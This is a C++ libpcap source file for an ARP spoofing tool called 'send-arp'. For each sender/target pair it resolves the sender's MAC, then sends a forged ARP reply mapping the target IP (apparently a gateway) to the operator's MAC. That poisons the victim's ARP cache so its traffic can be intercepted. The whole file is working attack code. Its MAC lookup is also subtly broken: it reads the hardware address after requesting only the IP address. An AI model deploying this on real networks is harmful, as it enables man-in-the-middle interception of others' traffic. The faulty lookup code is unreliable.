#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <unistd.h>

int get_my_addr(char *mymac, char *myip, char *interface) {
	struct ifreq ifr;

	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
	unsigned char *mac = NULL;

	int sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0) {
		printf("socket error\n");
		return -1;
	}

	if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) {
		printf("ioctl error\n");
		close(sock);
		return -1;
	}
	close(sock);

	mac = (unsigned char*) ifr.ifr_hwaddr.sa_data;
	struct sockaddr_in* sin = (struct sockaddr_in *)&ifr.ifr_addr;
	sprintf(mymac,"%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
	const char* ip = inet_ntop(AF_INET, &sin->sin_addr, myip, 16);
	if (ip == NULL) {
		printf("failed to get my ip\n");
		return -1;
	}

	return 0;
}

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
	// when the number of arg is less than 4
	// when sender-target pair doesn't exist
	if (argc < 4 || argc%2 == 1) {
		usage();
		return -1;
	}

	// device
	char* dev = argv[1];

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	// get my mac address
	char mymac[18];
	char myip[16];
	int success = get_my_addr(mymac, myip, dev);
	if (success < 0) {
		return -1;
	}
	printf("My mac address: %s\n", mymac);
	printf("My ip address: %s\n", myip);

	for (int i = 2; i < argc; i += 2) {
		EthArpPacket packet;

		// sender ip
		char* sip = argv[i];
		// target ip
		char* tip = argv[i+1];

		printf("\n==============%d==============\n", i/2);
		printf("sender ip: %s\n", sip);
		printf("target ip: %s\n\n", tip);
		
		// generate request to get sender's mac address
		packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
		packet.eth_.smac_ = Mac(mymac);
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Request);
		packet.arp_.smac_ = Mac(mymac);
		packet.arp_.sip_ = htonl(Ip(myip));
		packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
		packet.arp_.tip_ = htonl(Ip(sip));
		
		// send request
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		
		uint32_t response_sip;
		uint8_t* response_smac;
		uint32_t response_tip;
		uint8_t* response_dmac;
		while (true) {
			struct pcap_pkthdr* header;
			const u_char* packet;
			int res = pcap_next_ex(handle, &header, &packet);
			if (res == 0) continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				break;
			}
			struct EthHdr *eth_hdr = (struct EthHdr *) packet; 
			
			// if EtherType is not Arp, catch next packet
			if (eth_hdr->type() != eth_hdr->Arp) { 
				continue;
			}
			
			struct ArpHdr *arp_hdr = (struct ArpHdr *) (packet + 14);

			// get the sender mac and ip of reply
			response_sip = uint32_t(arp_hdr->sip());
			response_smac = (uint8_t*)(arp_hdr->smac());

			// check if the sender ip of response is the same as sender ip I want
			if (response_sip != Ip(sip)) {
				continue;
			}

			// get the target mac and ip of reply
			response_tip = uint32_t(arp_hdr->tip());
			response_dmac = (uint8_t*)(arp_hdr->tmac());

			break;
		}

		// 
		char smac[18];
		sprintf(smac,"%02x:%02x:%02x:%02x:%02x:%02x", response_smac[0], response_smac[1], response_smac[2], response_smac[3], response_smac[4], response_smac[5]);
		printf("sender mac: %s\n", smac);
		printf("=============================\n");
		// generate new reply that will go to sender

		// destination: sender mac
		// source: my mac
		packet.eth_.dmac_ = Mac(smac);
		packet.eth_.smac_ = Mac(mymac);
		packet.eth_.type_ = htons(EthHdr::Arp);

		// my mac:target ip => sender mac:sender ip
		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Reply);
		packet.arp_.smac_ = Mac(mymac);
		packet.arp_.sip_ = htonl(Ip(tip));
		packet.arp_.tmac_ = Mac(smac);
		packet.arp_.tip_ = htonl(Ip(sip));

		// send reply
		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}

	}
	// free(mymac);
	pcap_close(handle);
}
